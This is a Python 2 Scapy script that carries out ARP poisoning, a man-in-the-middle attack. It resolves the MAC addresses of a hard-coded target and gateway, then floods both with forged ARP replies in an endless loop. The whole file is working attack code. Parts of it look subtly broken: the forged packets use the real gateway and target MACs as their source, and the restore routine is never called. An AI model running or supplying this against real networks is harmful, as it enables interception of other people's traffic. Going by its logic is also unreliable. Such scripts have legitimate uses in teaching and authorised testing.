from scapy.all import *
import os
from time import sleep
import sys

interface = "eth0"
target_ip = "192.168.1.105"
gateway_ip = "192.168.1.1"

conf.iface = interface
conf.verb = 0
print "[*] Setting up %s" % interface

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print "[*] Restoring target..."
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)
    print "[*] Reset OK!"

def get_mac(ip):
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, retry=10)
    for s, r in responses:
        return r[Ether].src
    return None

def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac
    poison_target.hwsrc = gateway_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.hwsrc = target_mac
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print "[*] Beginning the ARP poison."

    while True:
        send(poison_target)
        send(poison_gateway)
        print "arpping..."
        sleep(2)

def main():
    gateway_mac = get_mac(gateway_ip)

    if gateway_mac is None:
        print "[!!!] Failed to get gateway MAC."
        sys.exit(0)
    else:
        print "[*] Gateway %s is at %s" % (gateway_ip, gateway_mac)

    target_mac = get_mac(target_ip)

    if target_mac is None:
        print "[!!!] Failed to get target MAC."
        sys.exit(0)
    else:
        print "[*] Target %s is at %s" % (target_ip, target_mac)

    arp_poison(gateway_ip, gateway_mac, target_ip, target_mac)

if __name__ == '__main__':
    main()